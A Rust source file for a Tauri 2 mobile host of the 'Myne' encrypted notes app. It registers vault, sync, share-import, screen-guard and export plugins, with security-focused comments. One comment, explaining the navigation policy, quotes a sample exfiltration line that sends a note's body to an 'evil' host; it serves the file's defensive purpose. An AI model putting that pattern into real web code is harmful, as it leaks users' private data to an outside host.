// SPDX-License-Identifier: AGPL-3.0-only
// Myne mobile — Tauri 2 host. Phase-1 vault + notes + prefs backend that
// consumes the shared `myne-core` crate (the single source of truth for the
// vault / notes / prefs plugin cores, extracted from the desktop crate) and the
// audited `protocol/` crate directly (no port). The still-desktop-only
// subsystems (clipper pairing, backup, importer, auto-lock, spell) are not
// carried over; themes and workspace are registered below. The core command
// cores trigger those side-effects through the `VaultLifecycleHooks` seam, into
// which mobile installs `hooks::MobileHooks` (no-op for every desktop-only
// side-effect; screen-capture protection is LIVE through that seam — see
// `screen_guard`, MYND-469). The
// `sync` plugin (MYND-458) IS registered here — a thin shim over
// `myne_core::plugins::sync` (the whole shared roster, one deny-by-default
// `sync:default` capability, SYNC-15); its `bump_local_change` hook stays a
// no-op until the SyncLocalChange wiring lands (MYND-458 task 4). The
// snapshots subsystem lives in `myne-core`, so `MobileHooks` wires its two
// snapshot hooks to the real snapshot store — a note overwrite/delete on
// mobile captures/purges `.myn` snapshots just like desktop. `vault-indices`
// (MYI1) IS shared from `myne-core` and registered here (its lock-teardown
// wipe is a desktop-only hooks side-effect).
//
// See the main repo's `src-tauri/AGENTS.md` "Secret-handling logging
// discipline" and `protocol/AGENTS.md` for the rules these modules follow.

// The crate-root support modules (atomic_write, paths, text, vault_registry, …)
// moved to `myne-core` (shared with the desktop client). Re-exported so existing
// `crate::<module>::…` paths keep resolving — the desktop `lib.rs` re-export
// pattern, mirrored here.
#[cfg(test)]
pub use myne_core::test_support;
pub use myne_core::{
    atomic_write, io_failure_kind, note_txn, paths, protocol_error_kind, text, vault_id,
    vault_meta_hash, vault_registry,
};

// myne-md/myne#491: keep the plaintext export directory out of the platform's
// automatic cloud backup. iOS does it at runtime (the module); Android does it
// declaratively from the committed `android-widgets` manifest. Declared for both
// so the setup hook has one unconditional call site.
mod backup_exclude;
// The Android Keystore half of the device signing key's storage ladder
// (`decisions/protocol/0733` decision 4, rung 2 on Android; myne-md/myne#938 task
// 9). A no-op off Android: `core`'s Apple arm already uses the Keychain.
mod device_key;
#[cfg(target_os = "android")]
mod device_key_keystore;
mod hooks;
#[cfg(target_os = "ios")]
mod ios_chrome;
// myne#453 (the mobile twin of myne#383): the app-global WebView navigation
// policy. The CSP has no directive that governs a top-level navigation, so
// `location = "https://evil/?d=" + noteBody` is outside every policy this
// `tauri.conf.json` can express; the `on_navigation` hook is.
mod navigation;
mod pdf_export;
mod plugins;
mod screen_guard;
mod share_file;
// SF2 (MYND-510): iOS Share Extension seam — the C-ABI seal shim the extension
// links + the App-Group container resolver the app's drain reads. iOS-only.
#[cfg(target_os = "ios")]
mod share_import_ffi;

// SF3 (MYND-511 / SYNC-3): the Android Keystore device-key provider for
// share-import. The shared-core seal/drain resolve their device wrap key through
// `myne_core::…::device_key::resolve` → the `AndroidShareDeviceKey` managed state
// registered below; this bridges that seam to the `tauri-plugin-share-intent`
// Kotlin Keystore plugin. Keeping the impl in the mobile host (not `core`) means
// `core` never depends on the mobile plugin. Android-only.
// ⚠️ DEVICE-VERIFY-PENDING — the Keystore behaviour needs a real device
// (`tauri-plugin-share-intent/KEYSTORE_TODO.md`).
#[cfg(target_os = "android")]
mod share_import_android {
    use tauri::{Manager, Runtime};

    pub struct KeystoreProvider<R: Runtime> {
        pub app: tauri::AppHandle<R>,
    }

    impl<R: Runtime> myne_core::plugins::share_import::device_key::AndroidShareDeviceKeyProvider
        for KeystoreProvider<R>
    {
        fn get_or_create(
            &self,
        ) -> Result<
            zeroize::Zeroizing<
                [u8; myne_core::plugins::share_import::device_key::SHARE_WRAP_KEY_LEN],
            >,
            myne_core::plugins::share_import::error::ShareImportError,
        > {
            use myne_core::plugins::share_import::error::ShareImportError;
            let si = self
                .app
                .try_state::<tauri_plugin_share_intent::ShareIntent<R>>()
                .ok_or(ShareImportError::HardwareUnavailable)?;
            si.get_or_create_device_key()
                .map_err(|_| ShareImportError::Backend)
        }
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    use tauri::{Listener, Manager};

    // Install the log sink so the app's `tracing::*!` events reach stdout —
    // without this nothing is printed (the shared cores + `screen_guard` emit
    // `tracing` but no subscriber was wired; desktop `lib.rs` parity). On iOS
    // stdout lands in the `tauri ios dev` terminal; on Android it surfaces via
    // `adb logcat -s RustStdoutStderr` (`dev-notes/device-matrix.md` §6.1).
    // Honors the secret-handling logging discipline — bounded variant names /
    // stage tags only, never key material.
    let _ = tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info")),
        )
        .try_init();

    tauri::Builder::default()
        // myne#453: the app-global navigation policy, registered FIRST so the
        // rule about what may load precedes every plugin that can cause a load.
        // Order is functionally irrelevant — the plugin store is read at
        // navigation time and fans out AND-style — but this is the one hook
        // that reaches the config-declared `main` window, and it reads as the
        // gate it is where it sits.
        .plugin(navigation::init())
        .plugin(tauri_plugin_opener::init())
        // Custom-scheme delivery for the iOS widgets (`myne://open` /
        // `myne://capture`). Registered here so the WebView can read the launch
        // URL (`getCurrent`) + runtime opens (`onOpenUrl`); the scheme itself is
        // declared in the app Info.plist (`CFBundleURLTypes`, project.yml). The
        // widget carries no plaintext — it only names an intent — so this stays
        // inside TB6: the app decides what `myne://capture` means (a new note,
        // after unlock), the widget cannot reach the vault.
        .plugin(tauri_plugin_deep_link::init())
        // MYND-469: screen-capture protection's Android FLAG_SECURE bridge (an
        // in-repo Kotlin plugin; Rust-only surface — no WebView commands, no
        // capability entry). On iOS/desktop this registers a no-op; the iOS
        // half lives in `screen_guard` (see the `.setup()` init below).
        .plugin(tauri_plugin_screen_guard::init())
        // myne-md/myne#938 task 9: the Android Keystore bridge for the DEVICE
        // SIGNING key (`decisions/protocol/0733` decision 4, rung 2 on Android). Same
        // shape as the screen-guard bridge: an in-repo Kotlin plugin, Rust-only
        // surface, no WebView commands, no capability entry. The host installs the
        // provider in `.setup()` below, so `myne-core` reads and writes the device key
        // through the Keystore instead of falling to rung 4 and signing `0x02` heads
        // forever. On iOS/desktop this registers a no-op.
        .plugin(tauri_plugin_device_key::init())
        // MYND-511: the Android OS-share-sheet (ACTION_SEND / ACTION_SEND_MULTIPLE)
        // receiver for share-import (SF3). An in-repo Kotlin plugin; Rust-only
        // WebView surface — no WebView commands, no capability entry. It reads the
        // shared file's bytes off the main thread and emits a global `share-intent`
        // event; the JS half (`shareImport.ts` `initShareIntent`) seals it via
        // `plugin:share-import|seal_share`. On iOS/desktop this registers a no-op
        // (the iOS Share Extension is a separate app-extension target).
        .plugin(tauri_plugin_share_intent::init())
        // myne-md/myne#505: the Android OUTBOUND half of the same idea, the
        // Storage Access Framework save picker, so an export written into the
        // app's own `Documents` directory can be handed to the user instead of
        // being stranded where no file manager will open it. In-repo Kotlin,
        // Rust-only surface; `share_file.rs` drives it. On iOS/desktop this
        // registers a no-op.
        .plugin(tauri_plugin_save_file::init())
        // MYND-466: iOS AVFoundation QR scanner for device-join via QR. The one
        // WebView-facing command (`scan`) is under the deny-by-default
        // `qr-scan:default` capability (camera-gated). On desktop/Android it
        // registers the command surface but returns Unsupported (SYNC-46; Android
        // decode is MYND-465).
        .plugin(tauri_plugin_qr_scan::init())
        // MYND-619: the task-reminder scheduler. The scheduling quartet
        // (`schedule` / `cancel` / `cancel_all` / `list_pending`) plus the
        // notification-permission pair and Android's precise-delivery pair, under the
        // deny-by-default `reminders:default` capability, bridging to the
        // in-repo Swift (iOS) and Kotlin (Android) halves. It is a TRANSPORT —
        // which reminders should be registered is decided by the pure TS core
        // above the seam — and it carries only an opaque identifier plus a local
        // instant, never task text or a note identifier (`threat-model.md` §7).
        // On the macOS dev host it registers the command surface but returns
        // Unsupported; the desktop client has its own native adapters.
        .plugin(tauri_plugin_reminders::init())
        // The clipboard transport (myne-md/myne#390 + myne-md/myne#455). Note
        // what is NOT here and must stay absent: `tauri_plugin_clipboard_manager`.
        // Its JS package was declared in `mobile/package.json` while the plugin
        // itself was registered nowhere, so every call through it rejected at
        // runtime and the account-number Copy has never worked on any device.
        // This plugin DOES grant a clipboard read, mobile-only and for one
        // caller (the recovery screen's Paste); the argument for it, and what it
        // costs, are in its `permissions/default.toml`.
        .plugin(tauri_plugin_sensitive_clipboard::init())
        .plugin(plugins::agent::init())
        .plugin(plugins::vault_creation::init())
        .plugin(plugins::vault_unlock::init())
        .plugin(plugins::vault_recover::init())
        .plugin(plugins::vault_change_password::init())
        .plugin(plugins::vault_delete::init())
        .plugin(plugins::vault_repair::init())
        .plugin(plugins::prefs::init())
        .plugin(plugins::notes::init())
        .plugin(plugins::quick_unlock::init())
        // Apple Watch voice-capture queue (MYK1, §9.18). Device-key sealed;
        // seal_staged/take_pending/ack. No-op off Apple targets. decisions.md
        // 2026-07-12. Commands must stay in lockstep with build.rs +
        // permissions/captures/default.toml or the ACL resolver fails closed.
        .plugin(plugins::captures::init())
        // Share-import staging queue (MYF1, §9.20). Device-key sealed;
        // seal_share / drain_pending_shares / share_ack. A file shared via the
        // OS share sheet is sealed while locked and drained into the attachment
        // library on unlock. Commands must stay in lockstep with build.rs +
        // permissions/share-import/default.toml or the ACL resolver fails closed.
        .plugin(plugins::share_import::init())
        .plugin(plugins::vault_indices::init())
        // Knowledge-graph layout cache (MYG1, §9.19): read/write of the
        // encrypted vault.graph node-position cache. Shared from `myne-core`;
        // the same two commands the desktop registers. Commands must stay in
        // lockstep with build.rs + permissions/graph-layout/default.toml or
        // the ACL resolver fails closed.
        .plugin(plugins::graph_layout::init())
        // AI conversations (MYM1 catalog + MYJ1 files, myne-md/myne#675):
        // the six storage commands, shared from `myne-core`. Commands must
        // stay in lockstep with build.rs + permissions/chats/default.toml or
        // the ACL resolver fails closed.
        .plugin(plugins::chats::init())
        // Agent memory (MYN1 catalog + MYX1 files + MYZ1 personality,
        // myne-md/myne#697): the six storage commands, shared from
        // `myne-core`. Commands must stay in lockstep with build.rs +
        // permissions/memory/default.toml or the ACL resolver fails closed.
        .plugin(plugins::memory::init())
        // Workspace state (MYW1, §9.7): read/write of the encrypted
        // vault.workspace descriptor, which on mobile carries the sidebar
        // folder-expand set (MYND-561). Mobile-LOCAL, not a `myne-core`
        // re-export (see `plugins/workspace/commands.rs` for why), and only 2 of
        // desktop's 3 commands — no `workspace_stage`. Commands must stay in
        // lockstep with build.rs + permissions/workspace/default.toml or the ACL
        // resolver fails closed.
        .plugin(plugins::workspace::init())
        // Custom themes (MYT1, §9.21): read-only consumer of the encrypted
        // vault.themes store the desktop authors and sync already delivers here.
        // Shared from `myne-core`, but ONE of desktop's five commands —
        // `themes_list`, whose entries carry each palette. The command list must
        // stay in lockstep with build.rs + permissions/themes/default.toml or
        // the ACL resolver fails closed.
        .plugin(plugins::themes::init())
        // Sealed label store (MYL1, §9.22): the device-local hide-vault-names
        // option (myne-md/myne#411). Shared from `myne-core`; the same three
        // commands the desktop registers, all reachable PRE-UNLOCK because the
        // surface they govern is the picker. The command list must stay in
        // lockstep with build.rs + permissions/vault-label/default.toml or the
        // ACL resolver fails closed.
        .plugin(plugins::vault_label::init())
        // Account record (the account/vault split, myne-md/myne#684). Shared
        // from `myne-core`; the same four commands the desktop registers, all
        // reachable PRE-UNLOCK because the surface they govern is the picker.
        // The command list must stay in lockstep with build.rs +
        // permissions/account/default.toml or the ACL resolver fails closed.
        .plugin(plugins::account::init())
        .plugin(plugins::search::init())
        .plugin(plugins::snapshots::init())
        .plugin(plugins::attachments::init())
        // MYND-211 (whole-vault plaintext markdown tree export): shared from
        // `myne-core`; the same two commands the desktop registers. The plugin
        // manages its own `ExportRuntime` cancel flag in its `.setup()`.
        .plugin(plugins::export::init())
        // Recovery-kit / account-number `.txt` save (vault-creation
        // PhraseStep / AccountStep): shared from `myne-core`; the same single
        // `save_secret_text` command the desktop registers. Narrow-seam file
        // write — the Rust core does the only IO and rejects any destination
        // inside the app-data / vault tree (TB6). Holds no plugin-private state.
        .plugin(plugins::secret_export::init())
        // The one destination a plaintext export may name (myne-md/myne#517).
        // `export_path` resolves the export directory, creates it, applies the
        // platform backup exclusion and sanitizes the filename in one call,
        // sharing its body with `backup_exclude::init` below. It is what let
        // `core:path:default` be dropped from `capabilities/default.json`:
        // nothing under `mobile/src` reaches `plugin:path|*` any more.
        .plugin(plugins::export_dir::init())
        // MYND-458: the mobile `sync` shim over `myne_core::plugins::sync` — the
        // same commands the desktop registers, gated by a single
        // deny-by-default `sync:default` capability (SYNC-15). Command bodies are
        // the shared-core compiled code; this crate adds only the wrapper +
        // capability entry. The scheduler/loop stays out (MYND-460).
        .plugin(plugins::sync::init())
        // Live co-editing sessions (epic live-collab, `collab-editor-bridge`):
        // the six shared-core commands the desktop registers, gated by a single
        // deny-by-default `live:default` capability. The registry below was
        // already managed and the awareness supervisor already spawned; what was
        // missing was this registration, so the commands could not be invoked
        // from the mobile WebView at all. Which gate each command carries is
        // stated per command in `plugins/live/mod.rs` rather than as one sentence
        // here (myne-md/myne#849 review): three are `Slot::Unlocked`-gated, while
        // `live_session_take_remote_splices`, `live_session_read` and
        // `live_session_set_presence` hold no vault authority and take no slot
        // check. `live_session_read` returns note plaintext, and what bounds all
        // three is the lock-teardown hook that clears the `LiveSessionRegistry`,
        // so on a locked vault there is no session and `read` answers `NotOpen`.
        .plugin(plugins::live::init())
        // B2B member display names (MYO5, §9.29; myne-md/myne#851 task 15): the
        // three shared-core commands the desktop registers, gated by a single
        // deny-by-default `member-names:default` capability. The phone's name step
        // is what calls `member_names_set_mine`, and a signed name row has no other
        // writer, so this registration IS that step's substrate.
        .plugin(plugins::member_names::init())
        // B2B device-to-person bindings (MYU5, §9.30; the `member-devices` feature):
        // the two shared-core commands the desktop registers, gated by a single
        // deny-by-default `device-binding:default` capability. A member's SECOND
        // device is the case the family exists for, and the phone is the device a
        // person is most likely to add one on, so this registration is that flow's
        // substrate rather than a companion to it.
        .plugin(plugins::device_binding::init())
        // On-device speech-to-text (Whisper, MYND-563): transcription-only mobile
        // plugin. Feature-gated by `local-inference` (default-on) — the module's
        // `init()` is a no-op when the feature is off, so this stays an
        // unconditional chain link. Commands (transcribe/read_transcript) must
        // stay in lockstep with build.rs + the runtime capability in
        // `local_inference/mod.rs` or the ACL resolver fails closed.
        .plugin(plugins::local_inference::init())
        // MYND-169: the `attachment://<id>` async custom-URI-scheme handler.
        // A custom protocol handler is a builder-level concern (not a plugin
        // invoke handler); it decrypts the MYA1 blob in memory, re-sniffs the
        // content-type, and serves only an allowlisted type (never text/html —
        // the XSS-defense invariant). See `plugins::attachments::scheme`.
        .register_asynchronous_uri_scheme_protocol(
            plugins::attachments::scheme::SCHEME,
            plugins::attachments::scheme::handle,
        )
        .setup(|app| {
            // Install the mobile lifecycle hooks the shared `myne-core` command
            // cores take as `State<'_, myne_core::hooks::Hooks>`. Every desktop-
            // only side-effect (search, spell, attachments, …) is a no-op, EXCEPT
            // the two snapshot hooks (the snapshots subsystem lives in `myne-core`,
            // so `MobileHooks::capture_snapshot` / `purge_note_snapshots` drive the
            // real snapshot store — a note overwrite/delete captures/purges `.myn`
            // snapshots just like desktop), `bump_local_change` (nudges the
            // `SyncLocalChange` counter below) AND `apply_screen_capture` (native
            // screen-capture protection). `MobileHooks` holds the `AppHandle` so
            // those hooks can reach managed state via `try_state` / dispatch onto
            // the main thread — mirrors the desktop `DesktopHooks::new(...)`.
            // Registered before any command can run.
            app.manage::<myne_core::hooks::Hooks>(std::sync::Arc::new(hooks::MobileHooks::new(
                app.handle().clone(),
            )));
            // myne-md/myne#938 task 9: hand `myne-core` the Android Keystore store, so
            // the device signing key rests there rather than not at all. Installed
            // before any command can run, and only ever once per process: a second
            // provider would be a second device key, and the device's binding follows
            // one key.
            device_key::install(app.handle());
            // MYND-458 task 4 (SYNC-35): app-level `SyncLocalChange` counter. A
            // local note edit bumps it via `MobileHooks::bump_local_change` so the
            // foreground sync loop (below) can open its coalesced-push window.
            // Mirrors the desktop `app.manage(SyncLocalChange::default())` wiring.
            app.manage(myne_core::plugins::sync::loop_control::SyncLocalChange::default());
            // SYNC-36: live Syncing/Error status cell. Without it every producer
            // (loop `set_syncing`/`set_error`) + the `sync_status` reader overlay
            // are `try_state`-None no-ops, so the status glyph/detail could never
            // reflect real in-flight sync activity or a failed cycle. Mirrors the
            // desktop `app.manage(SyncRuntimeStatusCell::default())` wiring.
            app.manage(myne_core::plugins::sync::commands::SyncRuntimeStatusCell::default());
            // Mobile lifecycle signal (SYNC-37/38): the WebView's
            // `visibilitychange` handler drives it via the
            // `sync_lifecycle_suspend`/`sync_lifecycle_resume` command pair, so
            // backgrounding hard-idles the loop and foregrounding arms the
            // one-shot resume-immediate poll (both already implemented in the
            // shared scheduler; this manage is what un-no-ops them). The
            // native-grace-window flush (iOS `beginBackgroundTask`) remains the
            // deferred MYND-460 F4 cluster — this is the WebView-visibility
            // subset that needs no native code.
            app.manage(myne_core::plugins::sync::loop_control::SyncLifecycleSignal::default());
            // SYNC-37 (decisions.md 2026-07-07): mobile v1 sync is **foreground-only**
            // — the loop RUNS while the app is foregrounded (unlock-gated, polling +
            // coalesced-push), which is what drives `run_active_cycle`: the sole path
            // (besides `sync_now`) that claims a per-device token after an existing
            // device approves this one, then pulls/pushes. Without it an approved
            // device stays PENDING forever. The clean background suspend/resume +
            // flush + grace-lock (SyncLifecycleSignal) is the deferred iOS-native
            // cluster (MYND-460 F4-T2/T3/T4); the loop reads that signal via
            // `try_state`→None (a safe no-op) until it lands, so foreground sync
            // works today. Mirrors the desktop `spawn_sync_loop(...)` wiring.
            myne_core::plugins::sync::loop_control::spawn_sync_loop(app.handle().clone());
            // The `Slot::Recovering` absolute deadline (myne-md/myne#758, audit
            // lead NV09). `recover_with_phrase` populates that slot from
            // `myne-core` on every client, but only the desktop idle-lock tick
            // ever expired it, so a phone left mid-recovery held the recovered
            // `root_key` + `items_key` with no deadline at all. The deadline and
            // the drop are shared; this is the timer this client was missing.
            // Mirrors the desktop tick that already calls the same function.
            myne_core::plugins::vault_unlock::recovering_ttl::spawn_recovering_ttl_timer(
                app.handle().clone(),
            );
            // The /sync/poke SSE listener (MYND-423 client half): while the app
            // is foregrounded + unlocked, a push on another device becomes a
            // pull here within seconds — baseline behaviour per the amended
            // sync-protocol §8.3 (no user toggle; polling stays the fallback).
            // The supervisor tears the stream down on suspend (via the
            // SyncLifecycleSignal above) and on lock, and parks on a revoked
            // token. Mirrors the desktop wiring.
            app.manage(myne_core::plugins::sync::poke_listener::SsePokeSignal::default());
            myne_core::plugins::sync::poke_listener::spawn_poke_supervisor(app.handle().clone());
            // Live-awareness stream (live-collab): sibling of the poke supervisor,
            // same gate, opaque frames. Mirrors the desktop wiring.
            app.manage(myne_core::plugins::sync::awareness_listener::AwarenessSignal::default());
            myne_core::plugins::sync::awareness_listener::spawn_awareness_supervisor(
                app.handle().clone(),
            );
            // Live co-editing sessions (live-collab, `collab-editor-bridge`): the
            // per-device registry of open notes' Automerge documents, cleared on
            // every vault-leaving hook. Mirrors the desktop wiring.
            app.manage(myne_core::plugins::live::LiveSessionRegistry::default());
            // MYND-31: app-level live in-RAM VaultIndices state (wikilink graph
            // + backlinks + tag index + typed properties), rebuilt on unlock by
            // the TS-orchestrated sweep. Mirrors the desktop `app.manage(...)`
            // wiring, INCLUDING the lock teardown: `MobileHooks::zeroize_vault_indices`
            // clears this on every slot drop (myne#454), and
            // `scripts/check-lock-teardown.mjs` fails if a client holds this state
            // with an empty hook body. This comment used to say mobile installed
            // `NoopHooks` and nothing tore it down, which is what the guard exists
            // to stop a reader from having to believe.
            app.manage(plugins::vault_indices::VaultIndicesState::default());
            // MYS1: app-level live in-RAM full-text search index (BM25). Fed by
            // the WebView via `search_index_replace` (the mobile client already
            // holds every note's plaintext, so it pushes the corpus down — no
            // Rust-side decryption/hydrate). Mirrors the desktop `app.manage(...)`
            // wiring, INCLUDING the lock teardown: `MobileHooks::zeroize_search_index`
            // clears this on every slot drop (myne#454) and the frontend re-pushes
            // the corpus on the next unlock. The wipe is one half; `note_search`
            // is slot-gated so a locked vault's index cannot answer through the
            // IPC door either, which is the property the shared `lock_from_host`
            // rests its no-leak claim on.
            app.manage(myne_core::search::SearchIndexState::default());
            // MYND-169: app-level live in-RAM attachment reference graph
            // (note → attachment-ids), rebuilt on unlock by the TS-orchestrated
            // note sweep. Mirrors the desktop `app.manage(...)` wiring, INCLUDING
            // the lock teardown: `MobileHooks::zeroize_attachment_refs` clears this
            // on every slot drop (myne#454), and the three attachment-ref commands
            // are slot-gated besides.
            app.manage(plugins::attachments::AttachmentRefsState::default());
            // Kill the native WKWebView keyboard "form assistant" bar (the
            // ‹ › ⌄ Done strip UIKit draws above the keyboard) — no web-side fix
            // exists for it. See `ios_chrome`. iOS-only; no-op elsewhere.
            #[cfg(target_os = "ios")]
            ios_chrome::suppress_keyboard_accessory_bar();

            // myne-md/myne#491: exclude the plaintext export directory from the
            // platform's automatic cloud backup, BEFORE any flow can write into
            // it. Four flows put plaintext there (recovery phrase / account
            // number, the whole-vault markdown tree, a note's PDF, an exported
            // attachment) and iCloud Backup carried all four; a saved recovery
            // phrase alone reconstructs the vault. Directory-level, so it covers
            // future writers too. iOS does it here; Android carries the same
            // property declaratively from the committed `android-widgets`
            // manifest, so this is a no-op there. See `backup_exclude`.
            //
            // Since myne-md/myne#517 this is no longer the ONLY place it
            // happens: `init` and `plugin:export-dir|export_path` share one
            // body (`backup_exclude::ensure`), and the command applies the
            // exclusion on every export, failing closed if it does not read
            // back as set. This call stays for the two things the command
            // cannot do, it repairs a container restored from an older backup
            // that predates the call, and it is what makes
            // `mobile/docs/dev/device-matrix.md` §8 row 8.9 ("launch the app
            // once, then `ls -l@` Documents") runnable exactly as written, on a
            // row nobody has run yet.
            backup_exclude::init(app.handle());

            // MYND-469: one-time secure-field layer splice, protection ON —
            // the pre-unlock always-ON invariant from before the first painted
            // frame. Setup runs inside the Ready dispatch AFTER the config
            // window exists, the startup point every deployed implementation
            // of this technique uses (the post-unlock variant crashed
            // on-device — see `screen_guard.rs`). Android needs no call here:
            // the Kotlin plugin's `load()` applies FLAG_SECURE itself.
            #[cfg(target_os = "ios")]
            screen_guard::init(app.handle());

            // SF2 (MYND-510): resolve the shared App-Group container once at
            // startup and inject it into the shared-core share-import queue seam,
            // so the drain (`drain_pending_shares`, run on unlock) reads the SAME
            // `pending-shares/sealed/` dir the headless Share Extension wrote in
            // its own process. No-op + app_data_dir fallback on an unprovisioned
            // build (no App-Group entitlement). iOS-only; see `share_import_ffi`.
            #[cfg(target_os = "ios")]
            share_import_ffi::init_app_group_queue();

            // SF3 (MYND-511 / SYNC-3): register the Android Keystore device-key
            // provider so the shared-core share-import seal/drain can reach the
            // Keystore-held wrap key while the vault is locked. Without it the
            // Android device-key arm returns HardwareUnavailable and every
            // share-import seal no-ops. Android-only; see `share_import_android`.
            #[cfg(target_os = "android")]
            app.manage(
                myne_core::plugins::share_import::device_key::AndroidShareDeviceKey(
                    std::sync::Arc::new(share_import_android::KeystoreProvider {
                        app: app.handle().clone(),
                    }),
                ),
            );

            // Screenshot-taken notice (MYND-476): when protection is engaged a
            // screenshot comes out black with no explanation, so observe the OS
            // "user took a screenshot" notification and emit SCREENSHOT_EVENT for
            // the WebView to surface an in-app banner. No-op off iOS.
            screen_guard::init_screenshot_detection(app.handle());

            // Native PDF export. `window.print()` is a no-op in the mobile
            // WebView, so the "Export as PDF" action emits EXPORT_PDF_EVENT with
            // the note title + rendered HTML; present the platform export sheet
            // (iOS print → Save to Files) on the main thread.
            {
                let handle = app.handle().clone();
                app.listen(pdf_export::EXPORT_PDF_EVENT, move |event| {
                    let Ok(payload) =
                        serde_json::from_str::<pdf_export::ExportPayload>(event.payload())
                    else {
                        return;
                    };
                    let _ = handle.run_on_main_thread(move || {
                        pdf_export::present(&payload.title, &payload.html, &payload.path)
                    });
                });
            }

            // Native file share/save (MYND-475, and the Android half myne-md/myne#505).
            // Export/download flows write the file to Documents (additive, no
            // regression) and then emit SHARE_FILE_EVENT with the path;
            // `share_file::present` dispatches to the platform chooser: iOS's
            // UIActivityViewController from the main thread, Android's SAF picker
            // from a background task. The two threading contracts are opposite, so
            // the dispatch lives behind that one call rather than here.
            {
                let handle = app.handle().clone();
                app.listen(share_file::SHARE_FILE_EVENT, move |event| {
                    let Ok(payload) =
                        serde_json::from_str::<share_file::SharePayload>(event.payload())
                    else {
                        return;
                    };
                    share_file::present(&handle, payload.path);
                });
            }
            Ok(())
        })
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
